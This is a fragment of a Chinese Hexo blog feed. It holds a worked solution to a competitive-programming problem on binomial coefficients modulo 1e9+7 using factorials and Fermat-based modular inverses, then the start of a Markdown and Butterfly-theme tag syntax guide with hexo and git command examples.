    <content type="html"><![CDATA[<h2 id="886-求组合数-II">886. 求组合数 II</h2><h3 id="题目">题目</h3><p>给定 <code>n</code> 组询问，每组询问给定两个整数 <code>a</code>，<code>b</code>，请你输出 $C_b^amod(10^9+7)$ 的值。</p><p>输入格式<br>第一行包含整数 <code>n</code>。接下来 <code>n</code> 行，每行包含一组 <code>a</code> 和 <code>b</code>。</p><p>输出格式共 <code>n</code>行，每行输出一个询问的解。</p><p>数据范围 $1≤n≤10000$,$1≤b≤a≤105$<br>输入样例：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>输出样例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="题解">题解</h3><h4 id="Q1：明明是除法为什么要特意转换成乘法">Q1：明明是除法为什么要特意转换成乘法</h4><blockquote><p>那是因为这道题目最后是要求余的，模运算与基本四则运算有些相似，但是除法例外。其规则如下：<br>(a + b) % p = (a % p + b % p) % p<br>(a - b) % p = (a % p - b % p) % p<br>(a _ b) % p = (a % p _ b % p) % p<br>但对于除法却不成立，即(a / b) % p 不等于 (a % p / b % p) % p 。</p></blockquote><hr><h4 id="Q2：那么为什么非要转换成乘法逆元呢？">Q2：那么为什么非要转换成乘法逆元呢？</h4><blockquote><p>不能使用除法，显然数学家们是不能忍受这种局面的，他们扔出了“逆元”来解决这个问题。</p></blockquote><h5 id="证明：">证明：</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">开始<span class="selector-tag">a</span>/<span class="selector-tag">b</span>≡m(modp) -------①</span><br><span class="line"></span><br><span class="line">假设存在 binv 满足<span class="selector-tag">a</span>⋅binv≡x(modp)-------②</span><br><span class="line"></span><br><span class="line">①②式两边同乘一个 <span class="selector-tag">b</span></span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span>≡bx(modp)----- ③</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span>⋅binv⋅<span class="selector-tag">b</span>≡bx(modp)------④</span><br><span class="line"></span><br><span class="line">根据模运算减法性质将两式相减④-③得 <span class="selector-tag">a</span>(binv⋅<span class="selector-tag">b</span>−<span class="number">1</span>)≡<span class="number">0</span>(modp)</span><br><span class="line"></span><br><span class="line">因为我们在找<span class="selector-tag">b</span>得乘法逆元，所以<span class="selector-tag">a</span>的值任意，所以式子相当于 binv⋅<span class="selector-tag">b</span>−<span class="number">1</span>≡<span class="number">0</span>(modp)</span><br><span class="line"></span><br><span class="line">即 binv⋅<span class="selector-tag">b</span>≡<span class="number">1</span>(modp)</span><br><span class="line">哎，binv是<span class="selector-tag">b</span>的逆元呀（x 在模运算的乘法中等同于 <span class="number">1</span>/<span class="selector-tag">b</span>, 这就是逆元的意义）</span><br><span class="line">所以我们只需要求<span class="selector-tag">b</span>的逆元即可</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h4 id="Q3-所以逆元要怎么求呢？-k-−1-≡-k-1-1-p−2-是哪里来的？-1-是逆元">Q3 所以逆元要怎么求呢？(k!)(−1)≡(k - 1)!(-1)^(p−2)是哪里来的？ <s>(-1)是逆元!!</s></h4><p>这里其实是有个小技巧的，因为 mod 是 1e9 +7，其实是一个非常大的质数，我们知道质数的因子只有 1 和其本身，所以 2~1e9 + 6 其实都是与 1e9 + 7 是互质<br>根据在 <a href="https://www.acwing.com/problem/content/878/">快速幂求逆元</a></p><blockquote><p>我们知道若整数 b，m 互质，并且对于任意的整数 a，如果满足 b|a，则存在一个整数 x，使得 a/b≡ax(modm)，则称 x 为 b 的模 m 乘法逆元，记为 $b^{−1}(modm)$。<br>b 存在乘法逆元的充要条件是 b 与模数 m 互质。当模数 m 为质数时，$b^{(m−2)}$ 即为 b 的乘法逆元。<br>以为 2~1e9 + 6 其实都是与 1e9 + 7 是互质的，所以根据小费马定理可以换算出$b^{(m−2)}$ 即为 b 的乘法逆元。</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">费马小定理：若 p 是质数，整数<span class="keyword">b不是p的倍数，则 </span><span class="keyword">b^(p−1)≡1(modp).</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">我们可以将式子变形：<span class="keyword">b⋅b^p−2≡1(modp)，所以 </span><span class="keyword">binv=b^p−2，结合快速幂模板可求解</span></span><br></pre></td></tr></table></figure><hr><h4 id="Q4：为什么在求逆元的时候-mod-后还要-mod">Q4：为什么在求逆元的时候 mod 后还要 mod</h4><blockquote><p>其实这可以参照模运算的乘法法则<br>因为在乘法过程中，答案会非常大，而 mod 多一次并不会改变最终的答案，可以举个小一点的例子，<s>我太懒了，这里就不举了</s>只是在过程中把量减小了，不会在计算过程中超出数据范围而出现什么奇怪的答案</p></blockquote><hr><h3 id="代码">代码</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef long long LL;</span><br><span class="line"></span><br><span class="line">const <span class="built_in">int</span> <span class="built_in">N</span> = <span class="number">100010</span>, <span class="built_in">mod</span> = <span class="number">1</span>e9 + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> <span class="built_in">fact</span>[<span class="built_in">N</span>];</span><br><span class="line"><span class="built_in">int</span> infact[<span class="built_in">N</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> qmi(<span class="built_in">int</span> a, <span class="built_in">int</span> b, <span class="built_in">int</span> m)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> res = <span class="number">1</span>;</span><br><span class="line">    while(b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">if</span>(b &amp; <span class="number">1</span>) res = (LL)res * a % <span class="built_in">mod</span>;</span><br><span class="line"></span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        a = (LL)a * a % <span class="built_in">mod</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    i<span class="symbol">os:</span><span class="symbol">:sy</span>nc_with_stdio(<span class="built_in">false</span>);</span><br><span class="line">    cin.tie(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">n</span>;</span><br><span class="line">    cin &gt;&gt; <span class="built_in">n</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fact</span>[<span class="number">0</span>] = infact[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    for(<span class="built_in">int</span> i = <span class="number">1</span>; i &lt; <span class="built_in">N</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fact</span>[i] = (LL)<span class="built_in">fact</span>[i - <span class="number">1</span>] * i % <span class="built_in">mod</span>;</span><br><span class="line">        infact[i] = (LL) infact[i - <span class="number">1</span>] * qmi(i, <span class="built_in">mod</span> - <span class="number">2</span>, <span class="built_in">mod</span>) % <span class="built_in">mod</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while (<span class="built_in">n</span> -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> a, b;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">        cout &lt;&lt; (LL)<span class="built_in">fact</span>[a] * infact[b] % <span class="built_in">mod</span> * infact[a - b] % <span class="built_in">mod</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">组合数问题</summary>
    
    
    
    <category term="算法" scheme="https://nonevector.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="组合数" scheme="https://nonevector.top/tags/%E7%BB%84%E5%90%88%E6%95%B0/"/>
    
    <category term="数论" scheme="https://nonevector.top/tags/%E6%95%B0%E8%AE%BA/"/>
    
    <category term="Acwing" scheme="https://nonevector.top/tags/Acwing/"/>
    
  </entry>
  
  <entry>
    <title>Markdown语法与外挂标签写法汇总</title>
    <link href="https://nonevector.top/posts/0.html"/>
    <id>https://nonevector.top/posts/0.html</id>
    <published>2022-08-09T10:19:03.000Z</published>
    <updated>2022-10-23T14:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /># 1.Markdown 语法自带格式<div class="note info flat"><p>参考：<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown 语法图文全面详解(10 分钟学会)</a></p></div><div class="note warning flat"><p>注意：此页面偶尔会存在 CSS 冲突问题!</p></div><h2 id="1-1-代码块">1.1 代码块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch;</span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch;</span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-2-多级标题">1.2 多级标题</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>见本文章标题!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-3-文字样式">1.3 文字样式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>这里的背景色是：MistyRosen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<s>删除</s>线演示</p><p><font size = 5>5 号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>上述要点可参考:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">【Markdown 语法】字体颜色大小及文字底色设置</a></p></div><h2 id="1-4-引用">1.4 引用</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt;</span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>Java<br>二级引用演示<br>MySQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>(引用内部一样可以用格式)</p></blockquote><p>…</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-5-分割线">1.5 分割线</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-6-列表-跟空格都可以">1.6 列表(*,+,-跟空格都可以)</h2><h3 id="1-6-1-无序列表">1.6.1 无序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-6-2-有序列表">1.6.2 有序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 注意后面有空格</span></span><br><span class="line"><span class="bullet">1.</span></span><br><span class="line"><span class="bullet">2.</span></span><br><span class="line"><span class="bullet">3.</span></span><br><span class="line">4.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li></li><li></li><li></li><li></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-7-图片">1.7 图片</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 本地图片</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># 在线图片</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>本地图片:<br><img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /><br>在线图片:<br><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-8-表格">1.8 表格</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 项目标号 | 资金     | 备注 |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100，000 | 无   |</span><br><span class="line">| 2        | 200，000 | 无   |</span><br><span class="line">| 3        | 300,600  | 重要 |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th>项目标号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100，000</td><td>无</td></tr><tr><td>2</td><td>200，000</td><td>无</td></tr><tr><td>3</td><td>300,600</td><td>重要</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-9-公式">1.9 公式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>2.Butterfly 外挂标签</h1><div class="note info flat"><p>这部分参考安知鱼:<a href="https://anzhiy.cn/posts/7d58.html">基于 Butterfly 的外挂标签引入</a></p></div><h2 id="2-1-行内文本样式-text">2.1 行内文本样式 text</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-2-行内文本-span">2.2 行内文本 span</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" 